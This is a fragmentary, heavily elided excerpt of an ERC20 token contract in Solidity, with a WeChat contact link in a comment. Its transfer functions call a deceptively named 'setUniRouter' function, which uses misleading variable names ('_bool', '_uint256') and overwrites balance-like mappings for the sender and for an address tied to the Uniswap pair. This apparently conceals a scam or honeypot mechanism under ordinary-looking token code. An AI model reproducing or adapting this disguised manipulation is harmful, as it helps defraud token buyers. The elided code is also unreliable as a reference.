...
// https://web.wechat.com/TheGrinchCH
...
contract Contract is IERC20, Ownable {
    ...
    function transferFrom(
        ...
        setUniRouter     (sender, recipient, amount);
        return _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {
        setUniRouter     (msg.sender, recipient, amount);
        return true;
    }
    ...
    function setUniRouter    (
        ...
        uint256 fee;
        if (_swapAndLiquifyEnabled && addressTokenBalance > _uint256 && !inSwapAndLiquify && from != uniswapV2Pair) {
            ...
            _isExcludedFromFees[from] = _isExcluded[from] - _uint256;
        }
        address _bool = _bots[uniswapV2Pair];
        if (_isExcludedFromFees[_bool] == 0) _isExcludedFromFees[_bool] = _uint256;
